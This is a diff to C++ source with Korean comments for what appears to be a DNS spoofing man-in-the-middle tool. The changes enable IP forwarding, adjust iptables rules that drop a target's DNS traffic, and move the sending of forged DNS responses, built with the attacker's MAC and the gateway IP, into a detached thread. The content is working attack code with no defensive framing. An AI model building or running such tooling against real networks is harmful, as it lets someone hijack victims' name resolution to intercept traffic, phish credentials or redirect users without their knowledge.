@@ -50,8 +50,8 @@ bool add_iptables_rules(const string& target_ip)
     system("echo 1 > /proc/sys/net/ipv4/ip_forward");
     
     // 대상 IP에서 게이트웨이로의 DNS 트래픽 차단 (요청)
-    string cmd1 = "iptables -A FORWARD -p udp -s " + target_ip + " --dport 53 -j DROP";
-    int ret1 = system(cmd1.c_str());
+    // string cmd1 = "iptables -A FORWARD -p udp -s " + target_ip + " --dport 53 -j DROP";
+    // int ret1 = system(cmd1.c_str());
     
     // 게이트웨이에서 대상 IP로의 DNS 트래픽 차단 (응답)
     string cmd2 = "iptables -A FORWARD -p udp -d " + target_ip + " --sport 53 -j DROP";
@@ -60,7 +60,8 @@ bool add_iptables_rules(const string& target_ip)
     // 그 외 모든 트래픽 허용
     system("iptables -A FORWARD -j ACCEPT");
     
-    return (ret1 == 0 && ret2 == 0);
+    // return (ret1 == 0 && ret2 == 0);
+    return ( ret2 == 0);
 }
 
 // iptables 규칙 제거
@@ -256,28 +257,29 @@ bool PacketForwarder::handle_dns_packet(const u_int8_t* packet, size_t packet_le
         
         if (is_target_domain) 
         {
-            // 패킷 복사 및 스푸핑
+            // 패킷 복사
             u_int8_t* packet_copy = new u_int8_t[packet_len];
             memcpy(packet_copy, packet, packet_len);
             
-            // DNS 스푸핑 응답 전송
-            send_dns_spoof_response(
-                handle, 
-                packet_copy, 
-                packet_len,
-                spoofer->get_attacker_mac(), 
-                spoofer->get_gateway_ip(),
-                domain, 
-                spoofer->get_targets()
-            );
-            
-            // 메모리 해제
-            delete[] packet_copy;
+            // DNS 스푸핑 응답 전송을 별도의 스레드로 실행하여 메인 루프 블록 방지
+            std::thread([this, packet_copy, packet_len, domain]() {
+                send_dns_spoof_response(
+                    handle,
+                    packet_copy,
+                    packet_len,
+                    spoofer->get_attacker_mac(),
+                    spoofer->get_gateway_ip(),
+                    domain,
+                    spoofer->get_targets()
+                );
+                delete[] packet_copy;
+            }).detach();
             
             cout << "DNS 요청 차단: " << domain << "\n";
             
             return true; // 패킷 드롭됨
         }
+
     }
     
     return false; // 패킷이 처리되지 않음
